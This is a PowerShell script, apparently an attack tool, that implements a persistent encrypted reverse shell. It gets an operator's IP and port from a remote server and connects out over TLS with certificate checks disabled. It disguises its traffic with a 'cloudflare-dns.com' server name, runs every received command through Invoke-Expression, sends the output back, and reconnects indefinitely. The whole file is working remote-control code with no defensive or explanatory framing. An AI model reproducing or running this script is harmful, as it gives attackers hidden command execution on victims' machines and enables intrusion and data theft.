function DNSLookup($DNSRecord){
    $response = (Invoke-WebRequest ('https://1.1.1.1/dns-query?name=powershell-reverse-shell.demo.example.com&type=' + $DNSRecord) -Headers @{'accept' = 'application/dns-json'}).content
    return ([System.Text.Encoding]::UTF8.GetString($response)|ConvertFrom-Json).Answer.data.trim('"')
}

$j = Invoke-RestMethod -Uri "SERVER_WHERE_IP_PORT_HOSTED"

$remoteIP = $j.IP
$remotePort = $j.PORT

while ($true) {
    do {
        Start-Sleep -Seconds 1
        try{
            $TCPConnection = New-Object System.Net.Sockets.TcpClient($remoteIP, $remotePort)
        }catch{}
    } until ($TCPConnection.Connected)

    try {
        $NetworkStream = $TCPConnection.GetStream()
        $sslStream = New-Object System.Net.Security.SslStream($NetworkStream, $false, ({$true} -as [System.Net.Security.RemoteCertificateValidationCallback]))
        $sslStream.AuthenticateAsClient("cloudflare-dns.com", $null, $false)

        if (!$sslStream.IsAuthenticated -or !$sslStream.IsSigned) {
            $sslStream.Close()
            $TCPConnection.Close()
            continue
        }

        $streamWriter = New-Object System.IO.StreamWriter($sslStream)

        function writeStreamToServer($string){
            $chunkSize = $TCPConnection.ReceiveBufferSize
            [byte[]]$script:buffer = 0..$chunkSize | % {0}
            $stringBytes = [System.Text.Encoding]::UTF8.GetBytes($string + 'SHELL '+(Get-Location).Path +' :>')
            for ($i = 0; $i -lt $stringBytes.Length; $i += $chunkSize) {
                $chunk = $stringBytes[$i..($i + $chunkSize - 1)]
                $streamWriter.Write([System.Text.Encoding]::UTF8.GetString($chunk))
                $streamWriter.Flush()
            }
        }

        writeStreamToServer ''

        while (($bytesRead = $sslStream.Read($script:buffer, 0, $script:buffer.Length)) -gt 0) {
        
            $command = [System.Text.Encoding]::UTF8.GetString($script:buffer, 0, $bytesRead - 1)
            if ($command -eq "exit" -or $command -eq "EXIT") {
                $streamWriter.Close()
                $sslStream.Close()
                $TCPConnection.Close()
                continue
            }
            $command_output = try {
                Invoke-Expression $command 2>&1 | Out-String
            }
            catch {
                $_ | Out-String
            }
            writeStreamToServer($command_output)
        }
        $streamWriter.Close()
        $sslStream.Close()
        $TCPConnection.Close()
    }
    catch {
        if ($streamWriter) { $streamWriter.Close() }
        if ($sslStream) { $sslStream.Close() }
        if ($TCPConnection) { $TCPConnection.Close() }
    }

    Start-Sleep -Seconds 2
}